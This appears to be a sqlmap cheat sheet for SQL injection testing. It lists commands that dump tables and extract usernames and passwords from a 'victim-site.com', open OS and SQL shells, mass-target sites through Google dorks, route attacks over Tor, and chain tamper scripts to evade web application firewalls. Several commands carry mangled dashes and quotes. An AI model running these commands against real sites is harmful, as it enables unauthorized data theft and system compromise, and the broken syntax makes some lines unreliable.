# Sqlmap_cheatsheet by Mangal Lopchan

# INTRODUCTION

SQLMap is a python open source Cyber Security testing tool that helps automate the process of exploiting SQL injection vulnerabilities.  It features many options to help you in your testing including support for the following: MySQL, Microsoft SQL Server, Oracle, Firebird, SAP MaxDB, Redshift, Mckoi, Presto, MimerSQL, SQLite, Apache Ignite, FrontBase, and many more. It also supports 6 injection types such as error-based, time-based blind, union query, Boolean-based blind. This tool can also detect password hashes and support for breaking them using a dictionary attack. Below I will provide you with a helpful sqlmap cheat sheet to help you when you are doing your testing.

# Simple usage

    sqlmap -u “http://target_server/”

# Specify target DBMS to MySQL

    sqlmap -u “http://target_server/” --dbms=mysql

# Using a proxy

    sqlmap -u “http://target_server/” --proxy=http://proxy_address:port

# Specify param1 to exploit

    sqlmap -u “http://target_server/param1=value1&param2=value2” -p param1

# Use POST requests

    sqlmap -u “http://target_server” --data=param1=value1&param2=value2

# Access with authenticated session

    sqlmap -u “http://target_server” --data=param1=value1&param2=value2 -p param1 cookie=’my_cookie_value’

# Basic authentication

    sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password

# Evaluating response strings

    sqlmap -u “http://target_server/” --string=”This string if query is TRUE”

    sqlmap -u “http://target_server/” --not-string=”This string if query is FALSE”

# List databases

    sqlmap -u “http://target_server/” --dbs

# List tables of database target_DB

    sqlmap -u “http://target_server/” -D target_DB --tables

# Dump table target_Table of database target_DB

    sqlmap -u “http://target_server/” -D target_DB -T target_Table -dump

# List columns of table target_Table of database target_DB

    sqlmap -u “http://target_server/” -D target_DB -T target_Table --columns

# Scan through TOR

    sqlmap -u “http://target_server/” --tor --tor-type=SOCKS5

# Get OS Shell

    sqlmap -u “http://target_server/” --os-shell
    
    
# Running Standard Test:

# Test if website is vulnerable to SQL injection

Checking if website is vulnerable to SQL injection

The example we utilize a standard GET request. This will test different methods of SQL injections

sqlmap –u “https://victim-site.com/product.php?id=1”  

# Enumerate all columns in databases

  List all databases in the websites DB

sqlmap –u “https://victim-site.com/product.php?id=1”  --dbs

# List tables

Find out how many tables the database has and what the names are.

sqlmap –u “https://victim-site.com/product.php?id=1”  -D dbname --tables

# List columns of table selected DB

List all columns of victim table

sqlmap –u “https://victim-site.com/product.php?id=1”  –D dbname  -T tablename  --columns

# List usernames

Get usernames from victim columns of selected table.

sqlmap –u “https://victim-site.com/product.php?id=1”  –D dbname  -T tablename  -C columnname --dump

# Extract pwd from victim column

Extract passwords from column

sqlmap –u “https://victim-site.com/product.php?id=1”  –D dbname  –C columname  --dump

Custom Methods:

Test on custom position on POST request method:

Use * to let sqlmap know the postion you want to use for sqlmap payload

sqlmap –u ‘https://victim-site.com/page/abc*’ --dbs

Google Dorks SQLMap method:

sqlmap  -g ‘inurl:”products.php?id”’ –random-agent –f –batch –answer=”extending=N,follow=N,keep=N,exploit=n”

# Get SQL Shell

Sqlmap –dbms=mysql –u “https://victim-site.com/login.php” –sql-shell

# Tor scanning:

sqlmap –u “https://victim-site.com/product.php?id=1” –tor –tor-type=SOCKS5

# There are 3 risk values:

    Risk 1: Default level
    Risk 2: Heavy query time based injections
    Risk 3: Adds OR based injections

# Levels:

    Level 2: HTTP Cookie Header Testing
    Level 3 HTTP User Agent and Referer Header Testing
    Level 5 Attack the Host Header

sqlmap –u “https://victim-site.com/product.php?id=1” –risk=2 –level=3

# Attack Method Choices:

You can let SQLMap know what exploit method you want to use:

    E: Error Based
    S: Stacked Queries
    T: Time Based Blind
    B: Boolean Based Blind
    U: Union Query
    Q: Inline Queries

sqlmap –u “https://victim-site.com/product.php?id=1” –technique=B

# Force SSL:

You can use the force SSL flag in SQLMap to utilize SSL in requests.

sqlmap –u “https://victim-site.com/product.php?id=1” –force-ssl

# Request File:

Use a request file that has the HTTP request

sqlmap  -r request.txt

# Specify Cookie Injection:

Must set level to be 2 or greater.

sqlmap  --cookie=”u_id=1” –u “https://victim-site.com/page.php” –p “u_id” –level 3

Evade WAF and Filters with Tamper Scripts:

Credit to RedCode for this one

sqlmap -u “http://www.victim-site.com/product.php?id=1” — level=5 —risk=3  tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords

# Resources for some switches:


    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file


    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)
    --string=STRING     String to match when query is evaluated to True
    --not-string=NOT..  String to match when query is evaluated to False
    --regexp=REGEXP     Regexp to match when query is evaluated to True
    --code=CODE         HTTP code to match when query is evaluated to True
    --smart             Perform thorough tests only if positive heuristic(s)
    --text-only         Compare pages based only on the textual content
    --titles            Compare pages based only on their titles
    
# Extra
# Specify The Database Type

sqlmap -u “https://target_site.com/page?p1=value1” --dbms=mysql

You can use other DBMS types like MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, Percona, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, etc. 

# Use Authenticated Session With Cookie
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"

# Use Authenticated Session with Auth Headers
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --headers="Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l"

# Basic Authentication
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --auth-type=basic --auth-cred=username:password
 
# Use Previously created Session as SQLmap input (-s)

If you got SQL injection positive somewhere, then sqlmap will automatically create a session file(.sqlite) for later use. Now, If you want to try some other commands later, you can use the session file directly (It will save your time to re-try all the possible payloads and identify the vulnerability and all.)

sqlmap -u “https://target_site.com/page?p1=value1" -s SESSION-FILE.sqlite --dbs

You can use this file from the home path of sqlmap tool’s output directory.
 
 
   
   
# Conclusion

SQLMap is a very powerful tool and is great when you want to automate your tasks instead of manually trying out every injection you can think of. There are many more ways to use SQLMap but we have covered the majority use cases for this wonderful tool. We will create a video in the future to demonstrate the techniques we have shown above to help simplify the tool for some users that are visual learners.

Remember there is no replacement to learning how the attacks work manually before learning a tool.  We always recommend you learn how and why something happens before using a tool to do the work for you.

Hope you like the SQLMap cheat sheet we have provided! If you have anything you would like to add to the list please feel free to reach out to us on our contact page. 
